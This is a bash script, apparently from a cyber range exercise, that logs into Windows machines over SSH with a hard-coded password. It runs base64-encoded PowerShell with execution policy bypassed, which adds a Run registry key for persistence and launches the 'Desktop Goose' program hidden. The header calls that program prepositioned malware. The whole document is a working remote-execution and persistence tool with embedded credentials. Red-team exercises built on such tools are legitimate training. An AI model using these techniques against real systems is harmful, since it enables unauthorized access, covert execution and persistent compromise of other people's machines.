#!/bin/bash
<<COMMENT

=============================================================================

 Central Texas Cyber Range (CTCR)

=============================================================================

 Maker:       Ethan Vowels

 Maintainer:  Ethan Vowels

 Project:     CIIRC

 Filename:    exeRegKey.sh

Git: Abanisenioluwa_oroj1

 Description:

    This script activates the prepositioned Goose Malware on the Window machines. It also adds the malware to each teams reg keys.

 Extension Principle:

    None

 License:

    MIT

 Additional Information:

    - Date Created: 7/17/2024

    - Last Updated: 7/18/2024

    - Contact: ethan_vowels1@baylor.edu

    - Repository: Gitlab CIIRC Hack

=============================================================================

COMMENT

# ENSURE ALL IPs ENTERED ARE PFSENSE IPs, there are port forward rules on each firewall
# Ensure this script is run with IP addresses as arguments
if [ $# -lt 1 ]; then
  echo "Usage: $0 <IP_Address1> [IP_Address2] ..."
  exit 1
fi

# Collect all IP addresses provided as arguments
TARGET_IPS=("$@")
# Variables
WINDOWS_USER="Sam_V"
WINDOWS_PASSWORD="CookingSkillet72-"

# PowerShell script
POWERSHELL_SCRIPT=$(cat <<'EOF'
$RegKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$ValueName = "Goose Desktop"
$ScriptPath = "C:\Users\Sam_V\Downloads\Desktop Goose v0.31\DesktopGoose v0.31\GooseDesktop.exe"

# Add the registry key
New-ItemProperty -Path $RegKey -Name $ValueName -Value $ScriptPath -PropertyType String -Force

# Start the process
Start-Process -FilePath $ScriptPath -WindowStyle Hidden
EOF
)

# Encode the PowerShell script in base64
ENCODED_SCRIPT=$(echo "$POWERSHELL_SCRIPT" | iconv -t UTF-16LE | base64 -w 0)

for TARGET_IP in "${TARGET_IPS[@]}"; do
  echo "Processing target: $TARGET_IP"

  #Execute the modified PowerShell script on the remote Windows machine
  sshpass -p "$WINDOWS_PASSWORD" ssh "$WINDOWS_USER@$TARGET_IP" powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand "$ENCODED_SCRIPT"

  echo "Done with target: $TARGET_IP"
done
